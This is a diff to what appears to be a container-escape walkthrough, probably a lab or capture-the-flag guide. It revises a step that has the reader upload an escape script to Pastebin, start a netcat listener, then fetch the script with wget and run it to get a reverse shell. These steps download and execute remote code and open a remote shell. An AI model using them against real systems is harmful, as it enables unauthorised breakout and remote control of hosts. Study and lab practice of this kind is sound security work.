@@ -150,10 +150,15 @@ If we see certain privilege bits set, it's time to break free! 🔓
 
 ## 🛠️ Step 4: Breaking Out of the Container
 
-Let's grab and execute the escape script, make sure to create new listener and change the IP and port number that within the script:
+Let's grab and execute the escape script, make sure to create new listener and change the IP and port number that within the script. 
+First navigate to the `examples` directory and find the script `container_escape_shell.sh`. Then, upload the script to PasteBin.com 
+Not Before you're changing the ATTACKER_IP and the REMOTE_IP parameters that within the script. 
+
+To use this script you need to create a new listener (you can create it on the same machine like before, just with different port,
+for example: `nc -nlvp 4445` The port before was 4444
 ```bash
 cd /tmp
-wget -O escape.sh -T https://pastebin.com/raw/YSbnzY2r
+wget -O escape.sh -T https://pastebin.com/raw/[your uploaded URL]
 sed -i 's/\r$//' escape.sh
 chmod +x escape.sh
 ./escape.sh
